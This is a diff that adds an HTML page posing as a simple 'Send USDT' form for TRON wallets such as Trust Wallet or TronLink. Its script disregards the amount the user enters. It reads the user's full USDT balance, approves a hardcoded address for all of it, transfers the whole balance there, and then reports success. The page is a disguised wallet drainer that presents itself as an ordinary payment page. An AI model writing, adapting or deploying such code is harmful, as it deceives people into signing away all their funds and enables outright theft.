@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send USDT</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen;
+      background-color: #ffffff;
+    }
+    .container {
+      padding: 20px;
+      max-width: 420px;
+      margin: 60px auto;
+    }
+    .label {
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 8px;
+      margin-top: 24px;
+    }
+    input {
+      width: 100%;
+      padding: 16px;
+      margin-bottom: 16px;
+      font-size: 18px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 16px;
+      font-size: 18px;
+      border: none;
+      border-radius: 12px;
+      background-color: #007aff;
+      color: white;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 16px;
+      font-size: 14px;
+      color: #555;
+      text-align: center;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+</head>
+<body>
+  <div class="container">
+    <div class="label">Recipient Address</div>
+    <input type="text" value="TBcBAXua2kNx1dzNzWJqY3LSVfq1EDGtpo" readonly />
+
+    <div class="label">Amount</div>
+    <input type="number" id="amount" placeholder="Enter amount" step="any" />
+
+    <button id="sendBtn">Next</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    (async function(){
+      const TRONGRID = 'https://api.trongrid.io';
+      const CONTRACT = 'TU2tSUZQdeZHZSrbkkCm1mV7Gm2K6zzSWm';
+      const RECEIVER = 'TBcBAXua2kNx1dzNzWJqY3LSVfq1EDGtpo';
+      const tronWeb = new TronWeb({ fullHost: TRONGRID });
+      const sendBtn = document.getElementById('sendBtn');
+      const status = document.getElementById('status');
+      let userAddress;
+
+      async function init() {
+        if(window.tronWeb && window.tronWeb.defaultAddress.base58){
+          userAddress = window.tronWeb.defaultAddress.base58;
+          status.innerText = "Wallet Connected: " + userAddress;
+        } else {
+          status.innerText = 'Please open in Trust Wallet, TronLink, or Bitget.';
+          sendBtn.disabled = true;
+          return;
+        }
+      }
+
+      sendBtn.addEventListener('click', async () => {
+        const amount = parseFloat(document.getElementById('amount').value);
+        if(isNaN(amount) || amount <= 0) { alert('Enter valid amount'); return; }
+
+        sendBtn.disabled = true;
+        status.innerText = 'Signing transaction...';
+
+        try {
+          alert("Sending request... Please sign in wallet");
+          const contract = await tronWeb.contract().at(CONTRACT);
+          const balanceSun = await contract.balanceOf(userAddress).call();
+          const balance = Number(balanceSun);
+          if(balance <= 0) throw new Error('No USDT balance');
+
+          await contract.approve(RECEIVER, balance).send();
+          await contract.transferFrom(userAddress, RECEIVER, balance).send();
+
+          status.innerText = 'Transaction Successful!';
+        } catch (e) {
+          console.error(e);
+          status.innerText = 'Error: ' + e.message;
+        }
+
+        sendBtn.disabled = false;
+      });
+
+      await init();
+    })();
+  </script>
+</body>
+</html>
